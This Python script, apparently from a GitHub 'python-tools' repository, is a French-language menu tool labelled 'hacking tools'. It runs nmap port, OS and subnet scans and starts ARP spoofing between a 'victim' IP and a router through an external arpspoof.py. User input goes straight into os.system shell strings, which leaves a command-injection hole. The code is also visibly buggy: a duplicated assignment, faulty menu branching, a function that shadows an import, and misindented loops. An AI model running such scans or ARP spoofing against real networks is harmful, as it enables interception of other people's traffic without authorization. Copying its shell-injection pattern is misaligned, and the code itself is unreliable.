#! /usr/bin/python3 

#******************************************* MAKE BY *********************************************
#                                          yannis-mlgrn 
#   github : https://github.com/yannis-mlgrn/
#   repository : https://github.com/yannis-mlgrn/python-tools/
#
# ***********************************************************************************************


import arpspoof
import nmap
import os 
from time import sleep
nm = nm = nmap.PortScanner()

# fonction menu principal
def menu():
    # écran menu
    os.system('clear')
    print(""" \033[31m                                                  
                )   )                )         (     
        (    ( /(( /(             ( /(         )\    
    `  )  )\ ) )\())\()) (   (      )\())(    ( ((_|   
    /(/( (()/((_))((_)\  )\  )\ )  (_))/ )\   )\ _ )\  
    ((_)_\ )(_)) |_| |(_)((_)_(_/(  | |_ ((_) ((_) ((_) 
    | '_ \) || |  _| ' \/ _ \ ' \)) |  _/ _ \/ _ \ (_-< 
    | .__/ \_, |\__|_||_\___/_||_|   \__\___/\___/_/__/ 
    |_|    |__/    
    """)

    print("\n \n ")
    print("\033[37m python hacking tools : \n")
    print ("    1. scan réseau \n")
    print ("    2. arp spoofing \n")
    c = input(" quel outil veut tu utiliser? : ")
    if c == '1' :
        os.system('clear')
        sleep(0.5)
        nmapscan()
    if c == '2' :
        arpspoof()
    else : 
        print("\n ERREUR :")
        print("veuillez rentrer un caractère valide")
        sleep(1.5)
        menu()
        
    

             
 # fonction menu nmap       
def  nmapscan() :
    os.system('clear')
    print("""\033[36m 
                                                             _             
                                                            (_)            
     _ __  _ __ ___   __ _ _ __    ___  ___ __ _ _ __  _ __  _ _ __   __ _ 
    | '_ \| '_ ` _ \ / _` | '_ \  / __|/ __/ _` | '_ \| '_ \| | '_ \ / _` |
    | | | | | | | | | (_| | |_) | \__ \ (_| (_| | | | | | | | | | | | (_| |
    |_| |_|_| |_| |_|\__,_| .__/  |___/\___\__,_|_| |_|_| |_|_|_| |_|\__, |
                        | |                                           __/ |
                        |_|                                          |___/ 
    \n \n""")
    print("\033[0m")
    print(" fonctions de nmap :")
    print("    1. scan des ports d'une ip")
    print("    2. scan os ")
    print("    3. scan reseau ")
    print("    4. retour au menu principal \n")
    
    c = input(" quelle action veux tu réaliser? : ")
    
    if c == '1' : 
        scanport()
    if c == '2' :
        scanos()
    if c == '3' :
        scanres()
    if c == '4' :
        menu()
        print("\n")
        q = input("do you want continue ? (y,n) : ")
        if q == 'y' :
            menu()
        else:
           quit() 
#fonction nmap scan os           
def scanos() :
        ip = input(" veuillez saisir l'ip de votre victime : " )
        print(" scan os with nmap")
        print("\n")
        os.system('sudo nmap '+ip+' -O' )
        print("\n")
        q = input("do you want continue ? (y,n) : ")
        if q == 'y' :
            nmapscan()
        else:
           quit() 
              
#fonction scan ports
def scanport() : 
    ip = input(" veuillez saisir l'ip de votre victime : " )
    nm.scan(ip,"1-1024")
    print(" commande : " + nm.command_line())
    print("\n scan du port 1 à 1024 ... \n ")
    for host in nm.all_hosts():
        print('---------------------------------------------------- \n ')
        print('Host : %s (%s)' % (host, nm[host].hostname()))
        print('State : %s' % nm[host].state())
    for proto in nm[host].all_protocols():
        print('\n----------\n')
        print('Protocol : %s' % proto)
 
        lport = nm[host][proto].keys()
        for port in lport:
            print ('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))
        print("\n")
        q = input("do you want continue ? (y,n) : ")
        if q == 'y' :
            nmapscan()
        else:               
           quit()

def scanres() :
        print(" scan os with nmap")
        print("\n")
        os.system('sudo nmap 192.168.0.0/24 ')
        print("\n")
        q = input("do you want continue ? (y,n) : ")
        if q == 'y' :
            nmapscan()
        else:
           quit() 

def arpspoof() :
        os.system('clear')
        print("""\033[0;32m
                                              _____            
  ____ __________     _________  ____  ____  / __(_____  ____ _
 / __ `/ ___/ __ \   / ___/ __ \/ __ \/ __ \/ /_/ / __ \/ __ `/
/ /_/ / /  / /_/ /  (__  / /_/ / /_/ / /_/ / __/ / / / / /_/ / 
\__,_/_/  / .___/  /____/ .___/\____/\____/_/ /_/_/ /_/\__, /  
         /_/           /_/                            /____/   


              """)
        interface = input("\033[0m veuillez saisir votre interface réseau : " )
        ip = input(" veuillez saisir l'ip de votre victime : " )
        iprouteur = input(" veuillez saisir l'ip de votre routeur : " )
        os.system('sudo python3 arpspoof.py -i ' + interface + ' -t ' + ip + ' ' + iprouteur)
        print("\n")
        q = input("do you want continue ? (y,n) : ")
        if q == 'y' :
            menu()
        else:
           quit() 
                         
if __name__ == "__main__":
    menu() 